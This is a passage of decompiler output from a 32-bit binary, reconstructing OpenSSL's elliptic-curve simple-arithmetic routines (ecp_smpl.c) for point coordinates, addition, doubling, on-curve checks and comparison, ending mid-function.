int __cdecl sub_481C70(int a1)
{
  return sub_416F90(*(_DWORD **)(a1 + 36));
}

//----- (00481C80) --------------------------------------------------------
int __cdecl sub_481C80(_DWORD *a1, int *a2)
{
  int *v2; // esi
  int *v4; // ebx
  int *v5; // ebp
  int (__cdecl *v6)(_DWORD *, int *, _DWORD, int *); // eax
  int v7; // edi
  _DWORD *v8; // edx
  BOOL v9; // eax
  int v11; // [esp-8h] [ebp-20h]
  void **Block; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  int *v14; // [esp+14h] [ebp-4h]
  int *v15; // [esp+1Ch] [ebp+4h]
  int *v16; // [esp+20h] [ebp+8h]

  v2 = a2;
  v13 = 0;
  v14 = (int *)a1[9];
  Block = 0;
  if ( !a2 )
  {
    Block = (void **)sub_420670();
    v2 = (int *)Block;
    if ( !Block )
    {
      sub_408310(16, 165, 65, (int)"crypto\\ec\\ecp_smpl.c", 253);
      goto LABEL_24;
    }
  }
  sub_420700(v2);
  v4 = sub_420790(v2);
  v15 = sub_420790(v2);
  v16 = sub_420790(v2);
  v5 = sub_420790(v2);
  if ( sub_420790(v2) )
  {
    v6 = *(int (__cdecl **)(_DWORD *, int *, _DWORD, int *))(*a1 + 152);
    if ( v6 )
    {
      if ( !v6(a1, v4, a1[16], v2)
        || !(*(int (__cdecl **)(_DWORD *, int *, _DWORD, int *))(*a1 + 152))(a1, v15, a1[17], v2) )
      {
        goto LABEL_22;
      }
      v7 = (int)v15;
    }
    else
    {
      if ( !sub_4173E0(v4, (_DWORD *)a1[16]) )
        goto LABEL_22;
      v8 = (_DWORD *)a1[17];
      v7 = (int)v15;
      if ( !sub_4173E0(v15, v8) )
        goto LABEL_22;
    }
    v9 = sub_416DB0((int)v4);
    v11 = v7;
    if ( v9 )
      goto LABEL_20;
    if ( sub_416DB0(v7) )
    {
LABEL_21:
      v13 = 1;
      goto LABEL_22;
    }
    if ( sub_42A4B0(v16, v4, v14, v2)
      && sub_42A430(v5, v16, (unsigned int **)v4, v14, v2)
      && sub_437C10(v16, v5, 2)
      && sub_42A4B0(v5, v15, v14, v2)
      && sub_438150((unsigned int **)v5, 0x1Bu)
      && sub_42A320(v4, (int)v16, (int)v5, v14, v2) )
    {
      v11 = (int)v4;
LABEL_20:
      if ( sub_416DB0(v11) )
        goto LABEL_22;
      goto LABEL_21;
    }
  }
LABEL_22:
  if ( v2 )
    sub_420750(v2);
LABEL_24:
  sub_4206C0(Block);
  return v13;
}

//----- (00481E60) --------------------------------------------------------
int __cdecl sub_481E60(int a1)
{
  _DWORD *v1; // eax
  void **v2; // ecx

  *(_DWORD *)(a1 + 4) = sub_4168C0();
  *(_DWORD *)(a1 + 8) = sub_4168C0();
  v1 = sub_4168C0();
  v2 = *(void ***)(a1 + 4);
  *(_DWORD *)(a1 + 12) = v1;
  *(_DWORD *)(a1 + 16) = 0;
  if ( v2 && *(_DWORD *)(a1 + 8) && v1 )
    return 1;
  sub_417060(v2);
  sub_417060(*(void ***)(a1 + 8));
  sub_417060(*(void ***)(a1 + 12));
  return 0;
}

//----- (00481EC0) --------------------------------------------------------
void __cdecl sub_481EC0(void ***Block)
{
  sub_417060(Block[1]);
  sub_417060(Block[2]);
  sub_417060(Block[3]);
}

//----- (00481EF0) --------------------------------------------------------
int __cdecl sub_481EF0(int a1, int a2)
{
  *(_DWORD *)(a2 + 16) = 0;
  sub_417490(*(_DWORD **)(a2 + 12), 0);
  return 1;
}

//----- (00481F10) --------------------------------------------------------
int __cdecl sub_481F10(int **a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  int *v6; // ebx
  int (__cdecl *v8)(int **, _DWORD, _DWORD, int *); // ecx
  int (__cdecl *v9)(int **, _DWORD, _DWORD, int *); // ecx
  BOOL v10; // ebp
  int (__cdecl *v11)(int **, _DWORD, _DWORD, int *); // ecx
  int (__cdecl *v12)(int **, _DWORD, int *); // eax
  int v13; // eax
  void **Block; // [esp+8h] [ebp-8h]
  int v15; // [esp+Ch] [ebp-4h]

  v6 = a6;
  Block = 0;
  v15 = 0;
  if ( !a6 )
  {
    Block = (void **)sub_420670();
    v6 = (int *)Block;
    if ( !Block )
      return 0;
  }
  if ( (!a3
     || sub_42A2D0(*(_DWORD **)(a2 + 4), a3, a1[9], v6)
     && ((v8 = (int (__cdecl *)(int **, _DWORD, _DWORD, int *))(*a1)[37]) == 0
      || v8(a1, *(_DWORD *)(a2 + 4), *(_DWORD *)(a2 + 4), v6)))
    && (!a4
     || sub_42A2D0(*(_DWORD **)(a2 + 8), a4, a1[9], v6)
     && ((v9 = (int (__cdecl *)(int **, _DWORD, _DWORD, int *))(*a1)[37]) == 0
      || v9(a1, *(_DWORD *)(a2 + 8), *(_DWORD *)(a2 + 8), v6))) )
  {
    if ( a5 )
    {
      if ( !sub_42A2D0(*(_DWORD **)(a2 + 12), a5, a1[9], v6) )
        goto LABEL_22;
      v10 = sub_416DC0(*(_DWORD *)(a2 + 12));
      v11 = (int (__cdecl *)(int **, _DWORD, _DWORD, int *))(*a1)[37];
      if ( v11 )
      {
        if ( v10 && (v12 = (int (__cdecl *)(int **, _DWORD, int *))(*a1)[39]) != 0 )
          v13 = v12(a1, *(_DWORD *)(a2 + 12), v6);
        else
          v13 = v11(a1, *(_DWORD *)(a2 + 12), *(_DWORD *)(a2 + 12), v6);
        if ( !v13 )
          goto LABEL_22;
      }
      *(_DWORD *)(a2 + 16) = v10;
    }
    v15 = 1;
  }
LABEL_22:
  sub_4206C0(Block);
  return v15;
}

//----- (00482060) --------------------------------------------------------
void **__cdecl sub_482060(int a1, _DWORD **a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, void **a6)
{
  void **v6; // ebp
  void **v7; // edi
  void **result; // eax
  _DWORD *v9; // eax
  int v10; // [esp+10h] [ebp-4h]

  v6 = 0;
  v10 = 0;
  if ( !*(_DWORD *)(*(_DWORD *)a1 + 152) )
  {
    if ( a3 && !sub_4173E0(a3, a2[1]) || a4 && !sub_4173E0(a4, a2[2]) )
      goto LABEL_18;
    if ( !a5 )
      goto LABEL_17;
    v9 = sub_4173E0(a5, a2[3]);
LABEL_16:
    if ( !v9 )
    {
LABEL_18:
      sub_4206C0(v6);
      return (void **)v10;
    }
LABEL_17:
    v10 = 1;
    goto LABEL_18;
  }
  v7 = a6;
  if ( a6 || (result = (void **)sub_420670(), v6 = result, (v7 = result) != 0) )
  {
    if ( a3 && !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, void **))(*(_DWORD *)a1 + 152))(a1, a3, a2[1], v7)
      || a4 && !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, void **))(*(_DWORD *)a1 + 152))(a1, a4, a2[2], v7) )
    {
      goto LABEL_18;
    }
    if ( !a5 )
      goto LABEL_17;
    v9 = (_DWORD *)(*(int (__cdecl **)(int, _DWORD *, _DWORD *, void **))(*(_DWORD *)a1 + 152))(a1, a5, a2[3], v7);
    goto LABEL_16;
  }
  return result;
}

//----- (00482180) --------------------------------------------------------
int __cdecl sub_482180(int a1, _DWORD *a2, int a3, int a4, int a5)
{
  void **v5; // eax

  if ( a3 && a4 )
  {
    v5 = sub_416820();
    return sub_436180(a1, a2, a3, a4, (int)v5, a5);
  }
  else
  {
    sub_408310(16, 168, 67, (int)"crypto\\ec\\ecp_smpl.c", 486);
    return 0;
  }
}

//----- (004821E0) --------------------------------------------------------
int __cdecl sub_4821E0(int **a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, int *a5)
{
  int *v6; // esi
  void **v7; // ebp
  int *v8; // ebx
  int (__cdecl *v9)(int **, _DWORD *, _DWORD, int *); // eax
  int (__cdecl *v10)(int **, _DWORD *, _DWORD, int *); // eax
  _DWORD *v11; // eax
  int v12; // eax
  int v13; // eax
  _DWORD *v14; // [esp+8h] [ebp-10h]
  _DWORD *v15; // [esp+Ch] [ebp-Ch]
  void **Block; // [esp+10h] [ebp-8h]
  int v17; // [esp+14h] [ebp-4h]

  Block = 0;
  v17 = 0;
  if ( sub_436430((int)a1, a2) )
  {
    sub_408310(16, 167, 106, (int)"crypto\\ec\\ecp_smpl.c", 506);
    return 0;
  }
  v6 = a5;
  if ( !a5 )
  {
    Block = (void **)sub_420670();
    v6 = (int *)Block;
    if ( !Block )
      return 0;
  }
  sub_420700(v6);
  v14 = sub_420790(v6);
  v7 = (void **)sub_420790(v6);
  v8 = sub_420790(v6);
  v15 = sub_420790(v6);
  if ( v15 )
  {
    v9 = (int (__cdecl *)(int **, _DWORD *, _DWORD, int *))(*a1)[38];
    if ( v9 )
    {
      if ( !v9(a1, v14, a2[3], v6) )
        goto LABEL_37;
    }
    else
    {
      v14 = (_DWORD *)a2[3];
    }
    if ( sub_416DC0((int)v14) )
    {
      v10 = (int (__cdecl *)(int **, _DWORD *, _DWORD, int *))(*a1)[38];
      if ( v10 )
      {
        if ( a3 && !v10(a1, a3, a2[1], v6) )
          goto LABEL_37;
        if ( !a4 )
          goto LABEL_36;
        v11 = (_DWORD *)((int (__cdecl *)(int **, _DWORD *, _DWORD, int *))(*a1)[38])(a1, a4, a2[2], v6);
      }
      else
      {
        if ( a3 && !sub_4173E0(a3, (_DWORD *)a2[1]) )
          goto LABEL_37;
        if ( !a4 )
          goto LABEL_36;
        v11 = sub_4173E0(a4, (_DWORD *)a2[2]);
      }
    }
    else
    {
      if ( !sub_4211F0(v7, v14, a1[9], v6) )
      {
        sub_408310(16, 167, 3, (int)"crypto\\ec\\ecp_smpl.c", 557);
        goto LABEL_37;
      }
      if ( (*a1)[37] )
        v12 = sub_42A4B0(v8, (int *)v7, a1[9], v6);
      else
        v12 = ((int (__cdecl *)(int **, int *, void **, int *))(*a1)[35])(a1, v8, v7, v6);
      if ( !v12 || a3 && !((int (__cdecl *)(int **, _DWORD *, _DWORD, int *, int *))(*a1)[34])(a1, a3, a2[1], v8, v6) )
        goto LABEL_37;
      if ( !a4 )
        goto LABEL_36;
      if ( (*a1)[37] )
        v13 = sub_42A430(v15, v8, (unsigned int **)v7, a1[9], v6);
      else
        v13 = ((int (__cdecl *)(int **, _DWORD *, int *, void **, int *))(*a1)[34])(a1, v15, v8, v7, v6);
      if ( !v13 )
        goto LABEL_37;
      v11 = (_DWORD *)((int (__cdecl *)(int **, _DWORD *, _DWORD, _DWORD *, int *))(*a1)[34])(a1, a4, a2[2], v15, v6);
    }
    if ( v11 )
LABEL_36:
      v17 = 1;
  }
LABEL_37:
  sub_420750(v6);
  sub_4206C0(Block);
  return v17;
}

//----- (00482480) --------------------------------------------------------
int __cdecl sub_482480(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  int (__cdecl *v6)(_DWORD *, int **, int **, int **, int *); // ebp
  int *v7; // esi
  int **v8; // edi
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int *v13; // [esp+Ch] [ebp-28h]
  int **v14; // [esp+10h] [ebp-24h]
  int **v15; // [esp+14h] [ebp-20h]
  int **v16; // [esp+18h] [ebp-1Ch]
  int **v17; // [esp+1Ch] [ebp-18h]
  int **v18; // [esp+20h] [ebp-14h]
  int (__cdecl *v19)(_DWORD *, int **, int **, int *); // [esp+24h] [ebp-10h]
  int **v20; // [esp+28h] [ebp-Ch]
  int v21; // [esp+2Ch] [ebp-8h]
  void **Block; // [esp+30h] [ebp-4h]

  Block = 0;
  v21 = 0;
  if ( a3 == a4 )
    return sub_436350((int)a1, (_DWORD *)a2, (_DWORD *)a3, a5);
  if ( sub_436430((int)a1, (_DWORD *)a3) )
    return sub_4360B0((_DWORD *)a2, (_DWORD *)a4);
  if ( sub_436430((int)a1, (_DWORD *)a4) )
    return sub_4360B0((_DWORD *)a2, (_DWORD *)a3);
  v6 = *(int (__cdecl **)(_DWORD *, int **, int **, int **, int *))(*a1 + 136);
  v7 = (int *)a5;
  v19 = *(int (__cdecl **)(_DWORD *, int **, int **, int *))(*a1 + 140);
  v13 = (int *)a1[9];
  if ( !a5 )
  {
    Block = (void **)sub_420670();
    v7 = (int *)Block;
    if ( !Block )
      return 0;
  }
  sub_420700(v7);
  v8 = (int **)sub_420790(v7);
  v17 = (int **)sub_420790(v7);
  v18 = (int **)sub_420790(v7);
  v14 = (int **)sub_420790(v7);
  v15 = (int **)sub_420790(v7);
  v16 = (int **)sub_420790(v7);
  v20 = (int **)sub_420790(v7);
  if ( !v20 )
    goto LABEL_59;
  if ( *(_DWORD *)(a4 + 16) )
  {
    if ( !sub_4173E0(v17, *(_DWORD **)(a3 + 4)) )
      goto LABEL_59;
    v9 = sub_4173E0(v18, *(_DWORD **)(a3 + 8));
  }
  else
  {
    if ( !v19(a1, v8, *(int ***)(a4 + 12), v7)
      || !v6(a1, v17, *(int ***)(a3 + 4), v8, v7)
      || !v6(a1, v8, v8, *(int ***)(a4 + 12), v7) )
    {
      goto LABEL_59;
    }
    v9 = (_DWORD *)v6(a1, v18, *(int ***)(a3 + 8), v8, v7);
  }
  if ( !v9 )
  {
LABEL_59:
    if ( v7 )
      sub_420750(v7);
    goto LABEL_61;
  }
  if ( *(_DWORD *)(a3 + 16) )
  {
    if ( !sub_4173E0(v14, *(_DWORD **)(a4 + 4)) )
      goto LABEL_59;
    v10 = sub_4173E0(v15, *(_DWORD **)(a4 + 8));
  }
  else
  {
    if ( !v19(a1, v8, *(int ***)(a3 + 12), v7)
      || !v6(a1, v14, *(int ***)(a4 + 4), v8, v7)
      || !v6(a1, v8, v8, *(int ***)(a3 + 12), v7) )
    {
      goto LABEL_59;
    }
    v10 = (_DWORD *)v6(a1, v15, *(int ***)(a4 + 8), v8, v7);
  }
  if ( !v10 || !sub_42A3F0(v16, (int)v17, (int)v14, (int)v13) || !sub_42A3F0(v20, (int)v18, (int)v15, (int)v13) )
    goto LABEL_59;
  if ( !sub_416DB0((int)v16) )
  {
    if ( !sub_42A360(v17, (int)v17, (int)v14, v13) || !sub_42A360(v18, (int)v18, (int)v15, v13) )
      goto LABEL_59;
    if ( *(_DWORD *)(a3 + 16) )
    {
      if ( *(_DWORD *)(a4 + 16) )
      {
        v11 = sub_4173E0(*(_DWORD **)(a2 + 12), v16);
LABEL_44:
        if ( !v11 )
          goto LABEL_59;
        *(_DWORD *)(a2 + 16) = 0;
        if ( !v19(a1, v8, v20, v7)
          || !v19(a1, v15, v16, v7)
          || !v6(a1, v14, v17, v15, v7)
          || !sub_42A3F0(*(_DWORD **)(a2 + 4), (int)v8, (int)v14, (int)v13)
          || !sub_42A4F0(v8, *(int ***)(a2 + 4), v13)
          || !sub_42A3F0(v8, (int)v14, (int)v8, (int)v13)
          || !v6(a1, v8, v8, v20, v7)
          || !v6(a1, v16, v15, v16, v7)
          || !v6(a1, v17, v18, v16, v7)
          || !sub_42A3F0(v8, (int)v8, (int)v17, (int)v13)
          || sub_416E20((int)v8) && !sub_4220E0(v8, (int)v8, (int)v13) )
        {
          goto LABEL_59;
        }
        if ( !sub_437B50(*(int **)(a2 + 8), (int *)v8) )
          goto LABEL_59;
        goto LABEL_58;
      }
      v12 = sub_4173E0(v8, *(_DWORD **)(a4 + 12));
    }
    else if ( *(_DWORD *)(a4 + 16) )
    {
      v12 = sub_4173E0(v8, *(_DWORD **)(a3 + 12));
    }
    else
    {
      v12 = (_DWORD *)v6(a1, v8, *(int ***)(a3 + 12), *(int ***)(a4 + 12), v7);
    }
    if ( !v12 )
      goto LABEL_59;
    v11 = (_DWORD *)v6(a1, *(int ***)(a2 + 12), v8, v16, v7);
    goto LABEL_44;
  }
  if ( !sub_416DB0((int)v20) )
  {
    sub_417490(*(_DWORD **)(a2 + 12), 0);
    *(_DWORD *)(a2 + 16) = 0;
LABEL_58:
    v21 = 1;
    goto LABEL_59;
  }
  sub_420750(v7);
  v21 = sub_436350((int)a1, (_DWORD *)a2, (_DWORD *)a3, (int)v7);
LABEL_61:
  sub_4206C0(Block);
  return v21;
}
// 482804: conditional instruction was optimized away because edx.4!=0

//----- (004829E0) --------------------------------------------------------
int __cdecl sub_4829E0(_DWORD *a1, int a2, _DWORD *a3, int *a4)
{
  int *v5; // esi
  int **v6; // edi
  int **v7; // ebp
  int v8; // eax
  int v10; // eax
  int v11; // edi
  int *v12; // [esp+Ch] [ebp-1Ch]
  int (__cdecl *v13)(_DWORD *, int **, int **, int *); // [esp+10h] [ebp-18h]
  int **v14; // [esp+14h] [ebp-14h]
  int (__cdecl *v15)(_DWORD *, int **, int **, int **, int *); // [esp+18h] [ebp-10h]
  int **v16; // [esp+1Ch] [ebp-Ch]
  void **Block; // [esp+20h] [ebp-8h]

  Block = 0;
  if ( sub_436430((int)a1, a3) )
  {
    sub_417490(*(_DWORD **)(a2 + 12), 0);
    *(_DWORD *)(a2 + 16) = 0;
    return 1;
  }
  v5 = a4;
  v15 = *(int (__cdecl **)(_DWORD *, int **, int **, int **, int *))(*a1 + 136);
  v13 = *(int (__cdecl **)(_DWORD *, int **, int **, int *))(*a1 + 140);
  v12 = (int *)a1[9];
  if ( !a4 )
  {
    Block = (void **)sub_420670();
    v5 = (int *)Block;
    if ( !Block )
      return 0;
  }
  sub_420700(v5);
  v6 = (int **)sub_420790(v5);
  v7 = (int **)sub_420790(v5);
  v14 = (int **)sub_420790(v5);
  v16 = (int **)sub_420790(v5);
  if ( v16 )
  {
    if ( a3[4] )
    {
      if ( v13(a1, v6, (int **)a3[1], v5) && sub_42A4F0(v7, v6, v12) && sub_42A360(v6, (int)v6, (int)v7, v12) )
      {
        v8 = sub_42A360(v7, (int)v6, a1[16], v12);
LABEL_26:
        if ( v8 )
        {
          if ( a3[4] ? sub_4173E0(v6, (_DWORD *)a3[2]) : (_DWORD *)v15(a1, v6, (int **)a3[2], (int **)a3[3], v5) )
          {
            if ( sub_42A4F0(*(int ***)(a2 + 12), v6, v12) )
            {
              *(_DWORD *)(a2 + 16) = 0;
              if ( v13(a1, v16, (int **)a3[2], v5) )
              {
                if ( v15(a1, v14, (int **)a3[1], v16, v5) )
                {
                  if ( sub_42A540(v14, v14, 2, v12) )
                  {
                    if ( sub_42A4F0(v6, v14, v12) )
                    {
                      if ( v13(a1, *(int ***)(a2 + 4), v7, v5) )
                      {
                        if ( sub_42A3F0(*(_DWORD **)(a2 + 4), *(_DWORD *)(a2 + 4), (int)v6, (int)v12) )
                        {
                          if ( v13(a1, v6, v16, v5) )
                          {
                            if ( sub_42A540(v16, v6, 3, v12) )
                            {
                              if ( sub_42A3F0(v6, (int)v14, *(_DWORD *)(a2 + 4), (int)v12) )
                              {
                                if ( v15(a1, v6, v7, v6, v5) )
                                {
                                  v10 = sub_42A3F0(*(_DWORD **)(a2 + 8), (int)v6, (int)v16, (int)v12);
                                  v11 = 1;
                                  if ( v10 )
                                    goto LABEL_44;
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    else if ( a1[18] )
    {
      if ( v13(a1, v7, (int **)a3[3], v5)
        && sub_42A360(v6, a3[1], (int)v7, v12)
        && sub_42A3F0(v14, a3[1], (int)v7, (int)v12)
        && v15(a1, v7, v6, v14, v5)
        && sub_42A4F0(v6, v7, v12) )
      {
        v8 = sub_42A360(v7, (int)v6, (int)v7, v12);
        goto LABEL_26;
      }
    }
    else if ( v13(a1, v6, (int **)a3[1], v5)
           && sub_42A4F0(v7, v6, v12)
           && sub_42A360(v6, (int)v6, (int)v7, v12)
           && v13(a1, v7, (int **)a3[3], v5)
           && v13(a1, v7, v7, v5)
           && v15(a1, v7, v7, (int **)a1[16], v5) )
    {
      v8 = sub_42A360(v7, (int)v7, (int)v6, v12);
      goto LABEL_26;
    }
  }
  v11 = 0;
LABEL_44:
  sub_420750(v5);
  sub_4206C0(Block);
  return v11;
}

//----- (00482DF0) --------------------------------------------------------
int __cdecl sub_482DF0(int a1, _DWORD *a2)
{
  if ( sub_436430(a1, a2) || sub_416DB0(a2[2]) )
    return 1;
  else
    return sub_421F50((_DWORD *)a2[2], *(_DWORD *)(a1 + 36), a2[2]);
}

//----- (00482E40) --------------------------------------------------------
BOOL __cdecl sub_482E40(int a1, int a2)
{
  return sub_416DB0(*(_DWORD *)(a2 + 12));
}

//----- (00482E60) --------------------------------------------------------
int __cdecl sub_482E60(_DWORD *a1, _DWORD *a2, int *a3)
{
  int *v4; // esi
  int *v5; // ebx
  int **v6; // ebp
  int v7; // eax
  int v8; // edi
  int *v9; // [esp+4h] [ebp-1Ch]
  int (__cdecl *v10)(_DWORD *, int *, int *, int **, int *); // [esp+8h] [ebp-18h]
  int **v11; // [esp+Ch] [ebp-14h]
  int (__cdecl *v12)(_DWORD *, int *, int **, int *); // [esp+10h] [ebp-10h]
  int *v13; // [esp+14h] [ebp-Ch]
  void **Block; // [esp+18h] [ebp-8h]

  Block = 0;
  if ( sub_436430((int)a1, a2) )
    return 1;
  v4 = a3;
  v10 = *(int (__cdecl **)(_DWORD *, int *, int *, int **, int *))(*a1 + 136);
  v12 = *(int (__cdecl **)(_DWORD *, int *, int **, int *))(*a1 + 140);
  v9 = (int *)a1[9];
  if ( !a3 )
  {
    Block = (void **)sub_420670();
    v4 = (int *)Block;
    if ( !Block )
      return -1;
  }
  sub_420700(v4);
  v5 = sub_420790(v4);
  v6 = (int **)sub_420790(v4);
  v11 = (int **)sub_420790(v4);
  v13 = sub_420790(v4);
  if ( !v13 || !v12(a1, v5, (int **)a2[1], v4) )
    goto LABEL_28;
  if ( a2[4] )
  {
    if ( !sub_42A360(v5, (int)v5, a1[16], v9) || !v10(a1, v5, v5, (int **)a2[1], v4) )
      goto LABEL_28;
    v7 = sub_42A360(v5, (int)v5, a1[17], v9);
  }
  else
  {
    if ( !v12(a1, (int *)v6, (int **)a2[3], v4) || !v12(a1, (int *)v11, v6, v4) || !v10(a1, v13, (int *)v11, v6, v4) )
      goto LABEL_28;
    if ( a1[18] )
    {
      if ( !sub_42A4F0(v6, v11, v9)
        || !sub_42A360(v6, (int)v6, (int)v11, v9)
        || !sub_42A3F0(v5, (int)v5, (int)v6, (int)v9) )
      {
        goto LABEL_28;
      }
    }
    else if ( !v10(a1, (int *)v6, (int *)v11, (int **)a1[16], v4) || !sub_42A360(v5, (int)v5, (int)v6, v9) )
    {
      goto LABEL_28;
    }
    if ( !v10(a1, v5, v5, (int **)a2[1], v4) || !v10(a1, (int *)v6, (int *)a1[17], (int **)v13, v4) )
    {
LABEL_28:
      v8 = -1;
      goto LABEL_29;
    }
    v7 = sub_42A360(v5, (int)v5, (int)v6, v9);
  }
  if ( !v7 || !v12(a1, (int *)v6, (int **)a2[2], v4) )
    goto LABEL_28;
  v8 = sub_416960(v6, v5) == 0;
LABEL_29:
  sub_420750(v4);
  sub_4206C0(Block);
  return v8;
}

//----- (004830E0) --------------------------------------------------------
int __cdecl sub_4830E0(int a1, _DWORD *a2, _DWORD *a3, int *a4)
{
  int result; // eax
  int *v5; // esi
  int (__cdecl *v6)(int, _DWORD *, _DWORD *, _DWORD *, int *); // ebp
  _DWORD *v7; // ebx
  _DWORD *v8; // ecx
  _DWORD *v9; // eax
  int v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // ebx
  _DWORD *v13; // eax
  _DWORD *v14; // [esp-10h] [ebp-34h]
  _DWORD *v15; // [esp+8h] [ebp-1Ch]
  _DWORD *v16; // [esp+Ch] [ebp-18h]
  _DWORD *v17; // [esp+10h] [ebp-14h]
  _DWORD *v18; // [esp+14h] [ebp-10h]
  int (__cdecl *v19)(int, _DWORD *, _DWORD, int *); // [esp+18h] [ebp-Ch]
  _DWORD *v20; // [esp+18h] [ebp-Ch]
  int v21; // [esp+1Ch] [ebp-8h]
  void **Block; // [esp+20h] [ebp-4h]

  Block = 0;
  v21 = -1;
  if ( sub_436430(a1, a2) )
    return sub_436430(a1, a3) == 0;
  if ( sub_436430(a1, a3) )
    return 1;
  if ( !a2[4] || !a3[4] )
  {
    v5 = a4;
    v6 = *(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136);
    v19 = *(int (__cdecl **)(int, _DWORD *, _DWORD, int *))(*(_DWORD *)a1 + 140);
    if ( !a4 )
    {
      Block = (void **)sub_420670();
      v5 = (int *)Block;
      if ( !Block )
        return -1;
    }
    sub_420700(v5);
    v16 = sub_420790(v5);
    v18 = sub_420790(v5);
    v17 = sub_420790(v5);
    v7 = sub_420790(v5);
    if ( !v7 )
      goto LABEL_36;
    v8 = a3;
    if ( a3[4] )
    {
      v9 = a2;
      v15 = (_DWORD *)a2[1];
    }
    else
    {
      if ( !v19(a1, v7, a3[3], v5) || !v6(a1, v16, (_DWORD *)a2[1], v7, v5) )
        goto LABEL_36;
      v9 = a2;
      v15 = v16;
      v8 = a3;
    }
    if ( v9[4] )
    {
      v20 = (_DWORD *)v8[1];
      v10 = sub_4169B0(v15, v20);
    }
    else
    {
      if ( !v19(a1, v17, v9[3], v5) || !v6(a1, v18, (_DWORD *)a3[1], v17, v5) )
        goto LABEL_36;
      v20 = v18;
      v10 = sub_4169B0(v15, v18);
    }
    if ( v10 )
    {
      v21 = 1;
    }
    else
    {
      v11 = a3;
      if ( a3[4] )
      {
        v15 = (_DWORD *)a2[2];
        v12 = a2;
      }
      else
      {
        if ( !v6(a1, v7, v7, (_DWORD *)a3[3], v5) )
          goto LABEL_36;
        v14 = v7;
        v12 = a2;
        if ( !v6(a1, v16, (_DWORD *)a2[2], v14, v5) )
          goto LABEL_36;
        v11 = a3;
      }
      if ( v12[4] )
      {
        v13 = (_DWORD *)v11[2];
      }
      else
      {
        if ( !v6(a1, v17, v17, (_DWORD *)v12[3], v5) || !v6(a1, v18, (_DWORD *)a3[2], v17, v5) )
          goto LABEL_36;
        v13 = v20;
      }
      v21 = sub_4169B0(v15, v13) != 0;
    }
LABEL_36:
    sub_420750(v5);
    sub_4206C0(Block);
    return v21;
  }
  if ( sub_4169B0((_DWORD *)a2[1], (_DWORD *)a3[1]) )
    return 1;
  result = sub_4169B0((_DWORD *)a2[2], (_DWORD *)a3[2]);
  if ( result )
    return 1;
  return result;
}

//----- (00483380) --------------------------------------------------------
int __cdecl sub_483380(int a1, _DWORD *a2, int *a3)
{
  int *v3; // esi
  _DWORD *v5; // ebx
  _DWORD *v6; // eax
  int v7; // edi
  void **Block; // [esp+8h] [ebp-8h]
  int v9; // [esp+Ch] [ebp-4h]

  Block = 0;
  v9 = 0;
  if ( a2[4] || sub_436430(a1, a2) )
    return 1;
  v3 = a3;
  if ( !a3 )
  {
    Block = (void **)sub_420670();
    v3 = (int *)Block;
    if ( !Block )
      return 0;
  }
  sub_420700(v3);
  v5 = sub_420790(v3);
  v6 = sub_420790(v3);
  v7 = (int)v6;
  if ( v6 && sub_4361F0(a1, a2, (int)v5, (int)v6, (int)v3) && sub_436DF0(a1, a2, (int)v5, v7, (int)v3) )
  {
    if ( a2[4] )
      v9 = 1;
    else
      sub_408310(16, 102, 68, (int)"crypto\\ec\\ecp_smpl.c", 1188);
  }
  sub_420750(v3);
  sub_4206C0(Block);
  return v9;
}

//----- (00483480) --------------------------------------------------------
int __cdecl sub_483480(int **a1, unsigned int a2, int a3, int *a4)
{
  unsigned int v4; // esi
  unsigned int v5; // edi
  int *v7; // ebx
  void **v8; // ebp
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  int (__cdecl *v12)(int **, _DWORD, int *); // eax
  int v13; // eax
  _DWORD *v14; // edi
  int (__cdecl *v16)(int **, void **, void **, int *); // eax
  unsigned int v17; // edi
  int v18; // edi
  _DWORD *v19; // edi
  int (__cdecl *v20)(int **, _DWORD, int *); // eax
  unsigned int i; // esi
  _DWORD *Block; // [esp+8h] [ebp-18h]
  int v24; // [esp+Ch] [ebp-14h]
  _DWORD *v25; // [esp+Ch] [ebp-14h]
  int v26; // [esp+Ch] [ebp-14h]
  _DWORD *v27; // [esp+14h] [ebp-Ch]
  void **v28; // [esp+18h] [ebp-8h]
  int v29; // [esp+1Ch] [ebp-4h]

  v4 = 0;
  v5 = a2;
  v28 = 0;
  Block = 0;
  v29 = 0;
  if ( !a2 )
    return 1;
  v7 = a4;
  if ( !a4 )
  {
    v28 = (void **)sub_420670();
    v7 = (int *)v28;
    if ( !v28 )
      return 0;
  }
  sub_420700(v7);
  v8 = (void **)sub_420790(v7);
  v9 = sub_420790(v7);
  v27 = v9;
  if ( v8 )
  {
    if ( v9 )
    {
      Block = sub_4133F0(4 * a2);
      if ( Block )
      {
        do
        {
          v10 = sub_4168C0();
          Block[v4] = v10;
          if ( !v10 )
            goto LABEL_55;
          ++v4;
        }
        while ( v4 < a2 );
        if ( sub_416DB0(*(_DWORD *)(*(_DWORD *)a3 + 12)) )
        {
          v12 = (int (__cdecl *)(int **, _DWORD, int *))(*a1)[39];
          v11 = (_DWORD *)(v12 ? v12(a1, *Block, v7) : sub_417490((_DWORD *)*Block, 1));
        }
        else
        {
          v11 = sub_4173E0((_DWORD *)*Block, *(_DWORD **)(*(_DWORD *)a3 + 12));
        }
        if ( v11 )
        {
          v24 = 1;
          if ( a2 > 1 )
          {
            v13 = a3 - (_DWORD)Block;
            v14 = Block + 1;
            while ( sub_416DB0(*(_DWORD *)(*(_DWORD *)((char *)v14 + v13) + 12))
                  ? sub_4173E0((_DWORD *)*v14, (_DWORD *)*(v14 - 1))
                  : (_DWORD *)((int (__cdecl *)(int **, _DWORD, _DWORD, _DWORD, int *))(*a1)[34])(
                                a1,
                                *v14,
                                *(v14 - 1),
                                *(_DWORD *)(*(_DWORD *)((char *)v14 + a3 - (_DWORD)Block) + 12),
                                v7) )
            {
              ++v14;
              if ( ++v24 >= a2 )
              {
                v5 = a2;
                goto LABEL_26;
              }
              v13 = a3 - (_DWORD)Block;
            }
            goto LABEL_54;
          }
